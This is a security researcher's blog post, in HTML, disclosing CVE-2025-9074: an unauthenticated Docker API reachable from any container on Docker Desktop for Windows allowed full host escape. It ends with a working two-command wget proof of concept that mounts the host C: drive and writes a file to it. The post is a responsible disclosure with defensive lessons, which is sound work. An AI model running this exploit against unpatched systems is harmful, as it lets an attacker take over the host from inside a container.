<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>When a SSRF is enough: Full Docker Escape on Windows Docker Desktop (CVE-2025-9074)</title>
  <style>
    pre {
      font-family: 'Courier New', Courier, monospace;
      white-space: pre;
    }
    body {
      background-color: #ffffcc;
      color: black;
      font-family: monospace;
      margin: 40px;
    }
    a {
      color: blue;
    }
    h2 { font-size: 1.2em; text-transform: lowercase; }
    hr { border: 1px dashed #999; }
    .blink {
      animation: blink 1s step-start infinite;
    }
    @keyframes blink {
      50% { opacity: 0; }
    }
    h1.rainbow {
      font-size: 32px;
      font-weight: bold;
      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet);
      -webkit-background-clip: text;
      color: transparent;
      display: inline-block;
    }
    .wave-letter {
      display: inline-block;
      animation: wave 1.5s infinite ease-in-out;
      font-weight: bold;
      font-size: 32px;
      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet);
      background-clip: text;
      -webkit-background-clip: text;
      color: transparent;
      background-size: 800% 100%;
    }
    .g0  { background-position: 0% 50%; }
    .g1  { background-position: 9% 50%; }
    .g2  { background-position: 18% 50%; }
    .g3  { background-position: 27% 50%; }
    .g4  { background-position: 36% 50%; }
    .g5  { background-position: 45% 50%; }
    .g6  { background-position: 54% 50%; }
    .g7  { background-position: 63% 50%; }
    .g8  { background-position: 72% 50%; }
    .g9  { background-position: 81% 50%; }
    .g10 { background-position: 90% 50%; }
    .g11 { background-position: 100% 50%; }
    @keyframes wave {
      0%   { transform: translateY(0); }
      25%  { transform: translateY(-6px); }
      50%  { transform: translateY(0); }
      75%  { transform: translateY(6px); }
      100% { transform: translateY(0); }
    }
    .wave-letter:nth-child(1)  { animation-delay: 0s; }
    .wave-letter:nth-child(2)  { animation-delay: 0.1s; }
    .wave-letter:nth-child(3)  { animation-delay: 0.2s; }
    .wave-letter:nth-child(4)  { animation-delay: 0.3s; }
    .wave-letter:nth-child(5)  { animation-delay: 0.4s; }
    .wave-letter:nth-child(6)  { animation-delay: 0.5s; }
    .wave-letter:nth-child(7)  { animation-delay: 0.6s; }
    .wave-letter:nth-child(8)  { animation-delay: 0.7s; }
    .wave-letter:nth-child(9)  { animation-delay: 0.8s; }
    .wave-letter:nth-child(10) { animation-delay: 0.9s; }
    .wave-letter:nth-child(11) { animation-delay: 1.0s; }
    .wave-letter:nth-child(12) { animation-delay: 1.1s; }
    pre.code-green {
      background: #000;
      color: #0f0;
      padding: 1em;
      overflow-x: auto;
      font-family: "Source Code Pro", monospace;
      border-radius: 4px;
      margin: 1.5em 0;
    }
    pre.code-green code {
      color: inherit;
      background: none;
    }
    p span {
      display: block;
    }
  </style>
</head>

<body class="site">
  <header class="site-header">
    <div class="inner">
      <nav class="site-nav">
        <a href="https://blog.qwertysecurity.com/">Home</a>
        <a href="https://www.linkedin.com/in/felix-boulet/">LinkedIn</a>
      </nav>
    </div>
  </header>

  <main class="site-main inner">
    <article class="post">
      <header class="post-header">
        <h1 class="post-title">
          When a SSRF is enough: Full Docker Escape on Windows Docker Desktop (CVE-2025-9074)
        </h1>
        <p class="post-meta"><b>August 20, 2025 - Vulnerability Write-up</b></p>
      </header>
      <div class="post-content">

        <p>
          <span>Sometimes bugs don't need to be that complicated. This is the tale of how I found the Full Docker Escape that was attributed "CVE-2025-9074" and that is now fixed with Docker Desktop patch "4.44.3".</span>
          <span>Up until that version, a SSRF or a simple web request from any container was enough to full compromise the host.</span>
          <span>I want to shout out <a href="https://www.linkedin.com/in/zer0x64/">Philippe Dugre from Pvotal Technologies</a>, he's a long time friend and a docker expert so I asked for his input and his help during that research.</span>
          <span>He was able to replicate a similar issue on Mac and this is why we share the CVE. I’ll link it here once it’s published.</span>
        </p>

        <hr />

        <h2>What Was at Risk?</h2>
        <p>
          <span>On unpatched Docker Desktop for Windows, any container could:</span>
        </p>
        <ul>
          <li>Connect to <code>http://192.168.65.7:2375/</code> without authentication</li>
          <li>Create and start a privileged container</li>
          <li>Mount the host <code>C:</code> drive into that container</li>
          <li>Gain full access on the Windows host</li>
        </ul>
        <p>
          <span>The control plane was exposed to the workloads it was supposed to isolate.</span>
        </p>

        <h2>How was it found</h2>
        <p>
          <span>It was by mistake actually, I did not know much about container separations and its implication.</span>
          <span>Since I found out a couple of years ago that one of the major VM software lets you poke the localhost interface from any VM in default configuration I have become pretty paranoid.</span>
          <span>As such, I was scanning my container's environment and while I was at it I was scanning the documented Docker private network that is found in the configurations.</span>
          <span>This is where I found the exposed docker API port, it is as simple as that.</span>
        </p>

        <h2>How the PoC Worked</h2>
        <p>
          <span>The entire exploit takes two POST HTTP calls from inside any container:</span>
        </p>
        <ol>
          <li>POST a JSON payload to <code>/containers/create</code>, binding the host C drive to a folder in the container (<code>/mnt/host/c:/host_root</code>) in the container and using a startup <code>Cmd</code> to write or read anything under <code>/host_root</code> on container startup.</li>
          <li>POST to <code>/containers/{id}/start</code> to launch the container and start the execution.</li>
        </ol>
         <p>
          <span>That POC would fully work from a SSRF. You technically do not need code execution on the container</span>
        </p>


        <h2>Spotting the Gap Sooner</h2>
        <p>
          <span>At its core, this vulnerability was a simple oversight, Docker’s internal HTTP API was reachable from any container without authentication or access controls.</span>
          <span>It’s a stark reminder that critical security gaps often stem from the most basic assumptions. I found this issue by running a quick nmap scan against the Docker’s documented private network.</span>
          <span>Scanning all private range subnet takes only minutes and might show you that you weren't as isolated as you thought.</span>
          <span>Always test your network isolation assumptions and do not trust that all security models are alligned by default.</span>
          <ul>
            <li>Internal interfaces are not inherently secure.</li>
            <li>Assess every access path and entry points: both external and internal tests and scans are essential.</li>
            <li>Encourage outside collaboration (for example, via a public or private bug bounty program) to uncover low-hanging fruit before attackers do.</li>
          </ul>
        </p>

        <h2>on bug bounty</h2>
        <p>
          <span>Sadly there is no bug bounty for docker</span>
          <span>But it was not some intense research and was found by mistake so that is totally okay</span>
          <span>I will receive a merch bag in a couple of days though!</span>
        </p>
          <div style="max-width: fit-content; margin-left: auto; margin-right: auto; text-align: center;">
            <img style="width: 75%; height: auto;" src="/Proofs/blog3/merchbag.png" />
            <div>Visual approximation of the merch bag contents. Expectations may vary.</div>
          </div>

        <h2>Key Lessons</h2>
        <ul>
          <li>Authenticate every control-plane endpoint, even “internal” ones</li>
          <li>Enforce network segmentation around containers</li>
          <li>Apply zero-trust principles within your host environment</li>
        </ul>

        <h2>Wrapping Up</h2>
        <p>
          <span>Docker Desktop 4.44.0 ships the fix—no known issues since.</span>
          <span>It’s a pity there’s no formal bounty program, but the patch arrived swiftly.</span>
          <span>CVE-2025-9074 is a stark reminder: unauthenticated APIs are a critical risk.</span>
          <span>No API should ever be exposed without authentication, regardless of network location.</span>
        </p>
        <p>
          <span>Link to the CVE: <a href="https://www.cve.org/CVERecord?id=CVE-2025-9074">https://www.cve.org/CVERecord?id=CVE-2025-9074</a></span>
          <span>Link to the Release Notes: <a href="https://docs.docker.com/desktop/release-notes/#4443">https://docs.docker.com/desktop/release-notes/#4443</a></span>
          <span>Link to Philippe Dugre's article: <a href="#">To be added</a></span>
        </p>

        <h2>Proof.mp4</h2>
          <p>
            <details>
              <summary style="cursor: pointer; font-weight: bold; color: blue; text-decoration: underline;">
                <a href=#videopoc>Click me for proof</a>
              </summary>
              <p id=videopoc >
              <br>
                <video style="width: 75%; height: auto;" muted autoplay controls>
                  <source src="/Proofs/blog3/poc.mp4" type="video/mp4">
                  Your browser does not support the video tag.
                </video>
              </p>
            </details>
          </p>
          <h2>POC</h2>
          <p>
          The POC can be executed from any container, running "docker run -it alpine '/bin/sh'" in PowerShell will start an alpine container which is perfect for this example.
              <pre class="code-green"><code>wget --header='Content-Type: application/json' \
--post-data='{"Image":"alpine","Cmd":["sh","-c","echo pwned > /host_root/pwn.txt"],"HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}' \
-O - http://192.168.65.7:2375/containers/create > create.json
cid=$(cut -d'"' -f4 create.json)
wget --post-data='' -O - http://192.168.65.7:2375/containers/$cid/start
</code></pre>
          </p>
      </div>
    </article>
  </main>

  <footer class="site-footer">
    <div class="inner">
      <nav class="site-nav">
        <a href="https://blog.qwertysecurity.com/">Home</a>
        <a href="https://www.linkedin.com/in/felix-boulet/">LinkedIn</a>
      </nav>
    </div>
  </footer>
</body>
</html>
